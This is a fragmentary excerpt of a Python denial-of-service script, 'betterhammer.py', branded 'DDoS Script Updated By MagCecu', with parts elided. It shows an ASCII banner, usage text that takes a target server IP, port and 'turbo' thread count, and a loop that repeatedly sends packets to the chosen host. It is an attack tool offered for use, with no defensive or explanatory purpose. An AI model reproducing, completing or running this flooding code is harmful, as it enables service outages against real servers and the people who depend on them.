#ITS AN UPDATE NOT REBRANDING THE ORIGINAL SCRIPT!
...
print(Center.XCenter(Colorate.Vertical(Colors.green_to_white, hammer, 2)))
print(f'{g}')
time.sleep(2)
os.system('cls' if os.name == 'nt' else 'clear')
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ( '',time.ctime(time.time())," <--Packet sended by The DDoser--> ")
			else:
				s.shutdown(1)
				print("off shod<->down")
			time.sleep(.1)
...
def usage():
    ...
    ______ _____ _____ _____ ___________   _   _   ___  ___  ______  ___ ___________ 
    | ___ \  ___|_   _|_   _|  ___| ___ \ | | | | / _ \ |  \/  ||  \/  ||  ___| ___ |
    | |_/ / |__   | |   | | | |__ | |_/ / | |_| |/ /_\ \| .  . || .  . || |__ | |_/ /
    | ___ \  __|  | |   | | |  __||    /  |  _  ||  _  || |\/| || |\/| ||  __||    / 
    | |_/ / |___  | |   | | | |___| |\ \  | | | || | | || |  | || |  | || |___| |\ \ 
    \____/\____/  \_/   \_/ \____/\_| \_| \_| |_/\_| |_/\_|  |_/\_|  |_/\____/\_| \_|
                             DDoS Script Updated By MagCecu 
		
	                 usage : python betterhammer.py  [-s] [-p] [-t]
	                           -s : The ip of the surver 
	                            -p : port (default 80)
	                  -t : turbo (deppends on your PC. Mid is 135)          
	''')
	sys.exit()
